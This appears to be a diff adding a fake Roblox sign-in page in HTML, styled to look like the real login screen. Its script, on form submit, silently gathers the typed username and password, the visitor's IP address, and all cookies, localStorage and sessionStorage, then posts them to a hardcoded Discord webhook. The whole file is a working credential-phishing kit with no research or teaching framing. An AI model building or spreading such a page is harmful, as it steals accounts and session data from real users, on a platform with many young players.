@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Sign In</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: "Segoe UI", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+            line-height: 1.4;
+            min-height: 100vh;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 30px;
+            background-color: #000000;
+            border-bottom: 1px solid #0f0f0f;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 10;
+        }
+        .header .left {
+            display: flex;
+            align-items: center;
+        }
+        .header .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-right: 20px;
+        }
+        .header a {
+            color: #b3b3b3;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 15px;
+            font-weight: 400;
+            transition: color 0.2s;
+        }
+        .header a:hover {
+            color: #ffffff;
+        }
+        .header .right {
+            display: flex;
+            align-items: center;
+        }
+        .header input {
+            background-color: #1f1f1f;
+            border: 1px solid #333333;
+            padding: 5px 10px;
+            color: #ffffff;
+            border-radius: 3px;
+            width: 180px;
+            font-size: 14px;
+            outline: none;
+            margin-left: 15px;
+        }
+        .header button {
+            background-color: #00a2ff;
+            color: #ffffff;
+            border: none;
+            padding: 6px 15px;
+            margin-left: 5px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+        .header button:hover {
+            background-color: #0090e0;
+        }
+        .login-box {
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 120px;
+            width: 320px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.7);
+            border: 1px solid #0f0f0f;
+        }
+        .login-box h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+        .login-box input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #333333;
+            border-radius: 4px;
+            background-color: #1f1f1f;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .login-box input:focus {
+            border-color: #00a2ff;
+            box-shadow: 0 0 5px rgba(0, 162, 255, 0.5);
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #00a2ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 15px;
+            transition: background-color 0.2s;
+        }
+        .login-box button:hover {
+            background-color: #0090e0;
+        }
+        .login-box a {
+            color: #00a2ff;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        .login-box a:hover {
+            text-decoration: underline;
+        }
+        .login-box .alt-options button {
+            background-color: #1f1f1f;
+            border: 1px solid #333333;
+            color: #b3b3b3;
+            margin: 8px 0;
+            padding: 8px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 12px;
+            transition: background-color 0.2s;
+        }
+        .login-box .alt-options button:hover {
+            background-color: #2a2a2a;
+            color: #ffffff;
+        }
+        .login-box p {
+            font-size: 12px;
+            color: #b3b3b3;
+            margin-top: 15px;
+        }
+        .footer {
+            margin-top: auto;
+            width: 100%;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 12px;
+            color: #808080;
+            border-top: 1px solid #0f0f0f;
+            margin-top: 40px;
+        }
+        .footer a {
+            color: #808080;
+            text-decoration: none;
+            margin: 0 10px;
+            font-weight: 400;
+        }
+        .footer a:hover {
+            color: #00a2ff;
+        }
+        .footer p {
+            margin-top: 10px;
+            font-size: 11px;
+            color: #666666;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="left">
+            <span class="logo">ROBLOX</span>
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+            <input type="text" placeholder="Search">
+        </div>
+        <div class="right">
+            <button>Register</button>
+            <button>Sign In</button>
+        </div>
+    </div>
+    <div class="login-box">
+        <h2>Sign In to Roblox</h2>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Username, Email, or Phone">
+            <input type="password" name="password" placeholder="Password">
+            <button type="submit">Sign In</button>
+        </form>
+        <a href="#">Forgot Password or Username?</a>
+        <div class="alt-options">
+            <button>Send One-Time Code via Email</button>
+            <button>Use Another Device</button>
+        </div>
+        <p>Don't have an account? <a href="#">Register</a></p>
+    </div>
+    <div class="footer">
+        <a href="#">About Us</a>
+        <a href="#">Jobs</a>
+        <a href="#">Blog</a>
+        <a href="#">Parents</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Privacy</a>
+        <a href="#">Your Privacy Choices</a>
+        <a href="#">Cookie Settings</a>
+        <p>©2025 Roblox Corporation, Roblox, the Roblox logo and "Powering Imagination" are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+    </div>
+    <script>
+        async function getIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return 'Unknown';
+            }
+        }
+
+        function getStoredData() {
+            const localStorageData = { ...localStorage };
+            const sessionStorageData = { ...sessionStorage };
+            const cookies = document.cookie ? document.cookie.split(';').reduce((acc, cookie) => {
+                const [name, value] = cookie.trim().split('=');
+                acc[name] = value;
+                return acc;
+            }, {}) : {};
+            return { localStorage: localStorageData, sessionStorage: sessionStorageData, cookies: cookies };
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const form = document.getElementById('loginForm');
+            const data = {};
+            const inputs = form.getElementsByTagName('input');
+            for (let input of inputs) {
+                data[input.name] = input.value || 'Not provided';
+            }
+            const ipAddress = await getIpAddress();
+            const storedData = getStoredData();
+
+            console.log('Collected Data:', { formData: data, ipAddress, storedData });
+
+            if (Object.keys(data).length === 0) {
+                console.log('No form data submitted.');
+                return;
+            }
+
+            const payload = {
+                content: `Login Attempt - Form Data: ${new URLSearchParams(data).toString()}, IP Address: ${ipAddress}, Time: ${new Date().toLocaleString('en-US', { timeZone: 'Europe/Berlin' })}, Stored Data: ${JSON.stringify(storedData)}`
+            };
+
+            try {
+                const response = await fetch('https://discord.com/api/webhooks/1392101396429406288/7KGAWtEdqIiHhy6a4aVUZyqxxaWoCvirq9SVETTyVqGjjEqIVner_nc949jFCRmLt2Qa', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+                if (!response.ok) {
+                    console.error('Webhook response:', await response.text());
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</body>
+</html>
